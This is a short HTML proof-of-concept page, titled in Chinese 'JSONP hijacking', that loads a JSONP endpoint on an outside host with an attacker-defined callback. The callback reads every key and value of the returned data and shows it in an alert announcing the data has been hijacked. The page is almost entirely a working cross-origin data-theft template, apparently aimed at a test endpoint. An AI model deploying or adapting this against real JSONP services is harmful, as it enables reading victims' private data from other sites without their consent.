<html>
<head>
<title>JSONP劫持</title>
<meta charset="utf-8">
</head>
<body>
<script>
    function jammny(obj){
        // 数据遍历
        var str = "";
        for (let key in obj){
            value = key+":"+obj[key];
            str = str + value;
        }
        alert("以下数据已被劫持！"+str)
    }
</script>
<script src="https://www.xcao.vip/test/csp/jsonp.php?callback=jammny"></script>
</body>
</html>
